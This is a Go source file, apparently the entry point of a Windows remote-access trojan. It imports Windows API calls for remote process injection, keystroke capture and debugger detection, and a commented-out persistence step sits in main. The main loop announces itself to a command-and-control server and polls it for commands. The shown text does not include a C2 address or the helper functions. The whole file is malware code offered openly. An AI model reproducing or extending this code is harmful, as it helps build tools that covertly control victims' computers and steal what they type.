package main

import (
	"fmt"
	"syscall"
	"time"
)

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

var K32 = syscall.MustLoadDLL("kernel32.dll")  //kernel32.dll
var USER32 = syscall.MustLoadDLL("user32.dll") //user32.dll
var GetAsyncKeyState = USER32.MustFindProc("GetAsyncKeyState")
var VirtualAlloc = K32.MustFindProc("VirtualAlloc")
var CreateThread = K32.MustFindProc("CreateThread")
var WaitForSingleObject = K32.MustFindProc("WaitForSingleObject")
var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")
var CreateRemoteThread = K32.MustFindProc("CreateRemoteThread")
var GetLastError = K32.MustFindProc("GetLastError")
var WriteProcessMemory = K32.MustFindProc("WriteProcessMemory")
var OpenProcess = K32.MustFindProc("OpenProcess")
var IsDebuggerPresent = K32.MustFindProc("IsDebuggerPresent")
var winmm = syscall.MustLoadDLL("winmm.dll")
var mciSendString = winmm.MustFindProc("mciSendStringW")

func main() {
	fmt.Println("")
	fmt.Println("[Core] Starting the application...")

	//if IsPersistent() == false {
	//	fmt.Println("[Core] Installing the persistence...")
	//	Persistence()
	//}

	configurations := loadConfig(true)
	fmt.Println("[Core] Ready to handle command !")
	fmt.Println("==================================")

	err := announce()

	if err != nil {
		fmt.Println("Can't Announce to C2 Server...")
		// TODO handle this case
	}

	// connect to C2 server and wait for commands
	for {
		getCommand()

		time.Sleep(time.Second * time.Duration(configurations.PullingRate))

	}

}
